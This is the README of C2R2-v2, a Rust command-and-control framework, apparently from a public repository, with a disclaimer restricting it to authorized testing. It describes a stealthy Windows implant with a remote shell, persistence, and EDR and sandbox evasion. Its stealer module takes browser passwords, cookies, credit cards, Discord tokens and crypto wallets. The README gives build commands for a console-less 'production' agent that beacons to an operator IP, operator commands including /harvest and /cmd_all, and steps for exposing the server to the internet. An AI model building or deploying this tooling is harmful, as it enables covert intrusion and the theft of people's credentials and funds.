# C2R2-v2 - Command & Control Framework

[![Rust](https://img.shields.io/badge/Rust-1.70+-orange.svg)](https://www.rust-lang.org/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)
[![Documentation](https://img.shields.io/badge/docs-latest-brightgreen.svg)](docs/)

A modular offensive security framework written in Rust, designed for authorized penetration testing and red team operations.

## ⚠️ LEGAL DISCLAIMER

**FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY**

This tool is provided for security researchers, penetration testers, and educational purposes. Any unauthorized use of this software to compromise systems you do not own or have explicit written permission to test is **illegal** and **unethical**.

**The authors and contributors assume NO LIABILITY for misuse or damages caused by this software.**

By using C2R2-v2, you agree to:
- ✅ Use it only on systems you own or have written authorization to test
- ✅ Comply with all applicable laws and regulations  
- ✅ Take full responsibility for your actions
- ❌ NEVER use it for illegal or malicious purposes

**Unauthorized access to computer systems is a crime. You have been warned.**

---z

## 📖 Documentation

**Complete documentation is available in the [`/docs`](docs/) directory:**

### Core Documentation
- **[Getting Started](docs/README.md)** - Overview and introduction
- **[Installation Guide](docs/INSTALLATION.md)** - Build and setup instructions
- **[Usage Guide](docs/USAGE.md)** - Command reference and examples
- **[Architecture](docs/ARCHITECTURE.md)** - System design and components
- **[Modules](docs/MODULES.md)** - Module documentation and development
- **[API Reference](docs/API.md)** - Developer API documentation
- **[Security](docs/SECURITY.md)** - Security considerations and OPSEC
- **[Contributing](docs/CONTRIBUTING.md)** - How to contribute
- **[Development](docs/DEVELOPMENT.md)** - Development guide

### Network Deployment Guides
- **[Network Deployment](docs/NETWORK_DEPLOYMENT.md)** - Complete guide for LAN/WAN deployments
- **[Raspberry Pi Setup](RASPBERRY_PI_SETUP.md)** - Step-by-step guide for Raspberry Pi with port forwarding
- **[Troubleshooting](docs/NETWORK_DEPLOYMENT.md#troubleshooting)** - Connection issues and solutions
- **[Solución de Problemas (Español)](SOLUCION_PROBLEMAS_ES.md)** - Guía de problemas de conexión en español

---

## 🎯 What is C2R2-v2?

C2R2-v2 (Command & Control Rust Reloaded) is a modular offensive security suite inspired by professional frameworks like Havoc C2 and Cobalt Strike. Built entirely in Rust, it combines memory safety with powerful capabilities for authorized security testing.

---

## 🚀 Features

### Core Capabilities

- ✅ **Lightweight Agent** - ~60KB binary with minimal dependencies
- ✅ **Multi-Client Support** - Handle multiple agents simultaneously
- ✅ **Beacon Communication** - Configurable intervals with jitter for stealth
- ✅ **Command Execution** - Remote shell with automatic obfuscation
- ✅ **File Operations** - Bidirectional file transfer (upload/download)
- ✅ **Persistence** - Multiple mechanisms (Registry, Tasks, WMI, Startup)
- ✅ **Credential Harvesting** - Multi-browser and application credential stealing
- ✅ **Cross-Compilation** - Build Windows agents from Linux/WSL
- ✅ **Modular Architecture** - Load capabilities on-demand via encrypted modules

### Advanced Features

- 🔒 **Direct Syscalls** - Bypass userland hooks (EDR evasion)
- 🎭 **Command Obfuscation** - ArgFuscator-style obfuscation for all commands
- 🔐 **Module Encryption** - AES-256-GCM encrypted capability modules
- 🎯 **Anti-Analysis** - Comprehensive VM, sandbox, and debugger detection (production mode only)
- 📊 **Structured Logging** - Comprehensive activity logging
- 🎨 **Colored CLI** - Beautiful terminal interface with tables

### Available Commands

```
📋 Client Management:
   /list                      - List all connected clients
   /select <id>               - Select a client by ID
   /deselect                  - Deselect current client
   /info <id>                 - Show detailed client information

💻 Command Execution:
   /cmd <command>             - Execute command on selected client
   /cmd_all <command>         - Execute command on ALL clients

📁 File Operations:
   /download <remote_path>    - Download file from agent
   /upload <local> <remote>   - Upload file to agent

🔧 Advanced Operations:
   /harvest                   - Harvest credentials from browsers/apps
   /elevate <command>         - Execute command with admin privileges (UAC prompt)
   /persist <method>          - Establish persistence (registry|task|wmi|startup)
   /persist_remove            - Remove all persistence mechanisms
   /beacon <int:jit>          - Configure beacon timing (e.g., 60:30)

ℹ️  Server:
   /help                      - Show command help
   /exit, /quit               - Shutdown server
```

For detailed command usage and examples, see the [Usage Guide](docs/USAGE.md).

---

## 🏗️ Architecture

C2R2-v2 follows a modular client-server architecture:

```
┌─────────────────┐
│   C2 Server     │  ◄─── Operator (Terminal/CLI)
│  (c2r2-server)  │
└────────┬────────┘
         │
         │ TCP Beacon (with jitter)
         ▼
┌─────────────────┐
│     Agent       │  ◄─── Target System (Windows)
│   (agent.exe)   │
└────────┬────────┘
         │
         │ Dynamic Loading
         ▼
┌─────────────────┐
│ Stealer Module  │  ◄─── Encrypted DLL Module
│ (stealer.dll)   │
└─────────────────┘
```

**Components:**
- **Agent** - Lightweight implant (60KB) with beacon communication
- **C2 Server** - Async multi-client server with interactive CLI
- **Builder** - Tool for agent generation and module encryption
- **Stealer** - Modular credential harvesting capability

For detailed architecture documentation, see [Architecture Guide](docs/ARCHITECTURE.md).

---

## 🔧 Quick Start

### Prerequisites

- Rust 1.70+ (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
- MinGW-w64 (`sudo apt install mingw-w64`)
- Windows target (`rustup target add x86_64-pc-windows-gnu`)

**Full installation instructions:** [Installation Guide](docs/INSTALLATION.md)

### Building

```bash
# 1. Build stealer module
./build-stealer.sh

# 2. Encrypt module
cd builder
cargo run --release -- encrypt-module

# 3. Build agent (choose mode)
# Development mode (with console & debug output)
cargo run --release -- build-agent --name agent-dev --server 192.168.1.10:4444

# Production mode (stealthy, no console, no debug output)
cargo run --release -- build-agent --name agent-prod --server 192.168.1.10:4444 --production

# 4. Build server
cd ../c2r2-server
cargo build --release
```

**📖 Build Modes:** See [BUILD.md](BUILD.md) for detailed documentation on development vs production builds.

⚠️ **Important**: Always use `--production` flag for real deployments to ensure stealth:
- ✅ No console window
- ✅ No debug output
- ✅ 100% stealthy operation

### Running

#### Local Network (LAN)

```bash
# Start C2 server (bind to all interfaces for network access)
cd c2r2-server
./target/release/c2r2-server --bind 0.0.0.0 --port 4444

# Deploy agent to target (Windows)
# Then interact from server:
C2R2> /list
C2R2> /select 1
C2R2 [1]> /cmd whoami
C2R2 [1]> /harvest
```

#### Internet Deployment (Port Forwarding)

For deploying over the internet with port forwarding (e.g., Raspberry Pi):

```bash
# 1. Configure router port forwarding: external 4444 → internal 4444
# 2. Open firewall: sudo ufw allow 4444/tcp
# 3. Start server: ./c2r2-server --bind 0.0.0.0 --port 4444
# 4. Build agent with PUBLIC IP: --server "YOUR_PUBLIC_IP:4444"
```

**📖 Having connection issues?** See:
- **[Raspberry Pi Setup Guide](RASPBERRY_PI_SETUP.md)** - Complete setup for Pi with port forwarding
- **[Network Deployment Guide](docs/NETWORK_DEPLOYMENT.md)** - Comprehensive network configuration
- **[Troubleshooting](docs/NETWORK_DEPLOYMENT.md#troubleshooting)** - Common connection problems

**Complete usage guide:** [Usage Documentation](docs/USAGE.md)

---

## 🛡️ Security Features

### Evasion Techniques

- **Direct Syscalls**: Bypass userland API hooks (EDR/AV evasion)
- **String Obfuscation**: Compile-time encryption of sensitive strings
- **Command Obfuscation**: ArgFuscator techniques for command-line evasion
- **Module Encryption**: AES-256-GCM encrypted capability modules
- **Memory-Only Loading**: Modules loaded directly into memory
- **Beacon Jitter**: Randomized check-in timing to avoid patterns
- **Anti-Analysis**: Debugger, VM, and sandbox detection

### Operational Security

See [Security Guide](docs/SECURITY.md) for:
- OPSEC best practices
- Detection evasion strategies
- Incident response procedures
- Threat model and adversaries

---

## 📦 Modules

### Stealer Module

Harvests credentials and sensitive data from:

- **Browsers**: Chrome, Firefox, Edge, Brave, Opera, Vivaldi
- **Communication**: Discord tokens, Telegram sessions
- **Wallets**: Exodus, Atomic, Electrum, Metamask
- **Gaming**: Steam, Epic Games
- **Data Types**: Passwords, cookies, autofill, credit cards

For module development and API reference, see [Modules Documentation](docs/MODULES.md).

---

## 🤝 Contributing

Contributions are welcome! Please read our [Contributing Guidelines](docs/CONTRIBUTING.md) before submitting pull requests.

### Development

See the [Development Guide](docs/DEVELOPMENT.md) for:
- Project structure
- Development setup
- Coding standards
- Testing procedures
- API documentation

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

**IMPORTANT**: This software is provided for educational and authorized testing purposes only. See the license file for the full disclaimer.

---

## 🙏 Acknowledgments

C2R2-v2 is inspired by:
- [Havoc C2](https://github.com/HavocFramework/Havoc) - Modern C2 framework
- [Cobalt Strike](https://www.cobaltstrike.com/) - Industry-standard red team tool
- [Metasploit](https://www.metasploit.com/) - Modular penetration testing framework
- [Covenant](https://github.com/cobbr/Covenant) - .NET C2 framework

Special thanks to the Rust community and security research community for their tools and techniques.

---

## 📧 Contact & Support

- **Issues**: [GitHub Issues](https://github.com/G4sp4rCS/C2R2-v2/issues)
- **Discussions**: [GitHub Discussions](https://github.com/G4sp4rCS/C2R2-v2/discussions)
- **Security**: Report vulnerabilities via [GitHub Security Advisories](https://github.com/G4sp4rCS/C2R2-v2/security/advisories)

---

## 📚 Version History

See [CHANGELOG.md](CHANGELOG.md) for version history and release notes.

**Current Version**: 2.0.0

---

**⚠️ Remember: With great power comes great responsibility. Use this tool ethically and legally. Always obtain proper authorization before testing any systems.**

